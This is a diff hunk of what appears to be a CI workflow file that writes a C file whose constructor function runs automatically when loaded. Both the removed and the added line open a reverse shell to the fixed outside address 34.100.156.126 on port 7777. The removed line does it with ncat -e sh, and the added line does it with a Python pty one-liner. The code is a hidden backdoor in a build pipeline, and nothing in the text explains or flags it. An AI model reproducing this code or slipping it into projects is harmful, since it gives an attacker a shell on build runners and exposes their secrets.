@@ -17,7 +17,7 @@ jobs:
           #include <stdlib.h>
           void __attribute__ ((constructor)) premain()
           {
-              system("ncat 34.100.156.126 7777 -e sh");
+            system("export RHOST=\"34.100.156.126\";export RPORT=7777;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'");
           }
           EOF
           mkdir -p ./build_dir
